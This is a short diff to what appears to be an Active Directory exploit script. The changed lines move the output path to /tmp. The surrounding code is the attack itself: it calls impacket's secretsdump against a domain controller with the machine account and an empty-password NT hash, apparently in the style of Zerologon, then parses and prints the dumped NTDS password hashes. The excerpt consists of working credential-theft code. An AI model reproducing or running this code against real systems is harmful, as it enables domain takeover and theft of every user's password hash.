@@ -111,7 +111,7 @@ def perform_attack(options):
         def __init__(self):
             self.use_vss = False
             self.target_ip = dc_ip
-            self.outputfile = './dumped.tmp'
+            self.outputfile = '/tmp/dumped.tmp'
             self.hashes = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
             self.exec_method = "smbexec"
             self.just_dc = True
@@ -131,7 +131,7 @@ def perform_attack(options):
 #        h.login(target_computer + '$', '')
     secretsdump.DumpSecrets(dc_ip, target_computer+'$', '', '', SDOptions()).dump()
 
-    f= open("dumped.tmp.ntds").read()
+    f= open("/tmp/dumped.tmp.ntds").read()
 #    print(f)
     hashes = ':'.join(f.split(':')[2:-3])
     print(hashes)
